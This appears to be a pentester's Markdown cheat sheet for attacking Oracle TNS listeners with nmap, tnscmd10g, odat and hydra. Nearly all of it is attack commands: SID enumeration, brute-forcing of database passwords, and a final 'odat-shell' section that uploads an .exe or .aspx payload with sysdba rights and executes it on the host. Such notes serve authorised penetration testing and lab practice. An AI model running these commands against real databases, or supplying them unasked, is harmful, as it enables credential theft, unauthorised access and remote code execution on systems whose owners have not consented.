# slqi oracle odat

## Recon

```bash
nmap --script "oracle-tns-version" -p 1521 -T4 -sV DOMAIN|IP

# if TNS versions are incompatible using --10G flag
tnscmd10g status -h DOMAIN|IP [--10G]

(ERROR=(CODE=12618) => TNS version incompatible
(ERROR=(CODE=1189) => TNS could not authenticate user; needs PASS
```

[Oracle Error Code Reference Link](https://docs.oracle.com/database/121/ERRMG/TNS-00000.htm#ERRMG-GUID-D723D931-ECBA-4FA4-BF1B-1F4FE2EEBAD7)

## odat-enum

```bash
odat tnscmd -s DOMAIN|IP -p 1521 --CMD
CMD = [version | ping | status | services]

# sid enumeration
odat sidguesser -s DOMAIN|IP -p 1521 [--sids-file=/opt/oracle-tns/sids-oracle.txt]
hydra -L /opt/oracle-tns/sids-oracle.txt -s 1521 DOMAIN|IP oracle-sid

# password brute-force
# needs wordlist in format user/pass
sudo odat passwordguesser -s DOMAIN|IP -p 1521 -d "SID" --accounts-file FULL-PATH-FILE [--sysdba]

# /files/userpass-brute-oracle-tns.py
# needs wordlist in format user:pass
python oracle-userpass-brute.py DOMAIN|IP oracle_default_userpass.txt

# automated check
odat all -s DOMAIN|IP -d SID -U USER -P PASS [--sysdba]
```

## odat-shell

```bash
# upload and execute
odat utlfile -s DOMAIN|IP -p 1521 -U USER -P PASS -d SID --sysdba --putFile  C:\\PATH-TO-WRITE FILE.exe LOCAL-PATH-FILE.exe
odat externaltable -s DOMAIN|IP -p 1521 -U USER -P PASS -d SID --sysdba --exec /PATH-TO-FILE FILE.exe

[OR]
odat dbmsadvisor -s DOMAIN|IP -p 1521 -d SID -U USER -P PASS --sysdba --putFile C:\\PATH-TO-WRITE FILE.aspx LOCAL-PATH-FILE.aspx
```

![](https://0xdf.gitlab.io/img/ODAT_main_features_v2.0.jpg)

## Additional Material

* [Hacktricks/1521-1522-1529-pentesting-oracle-listener](https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener)
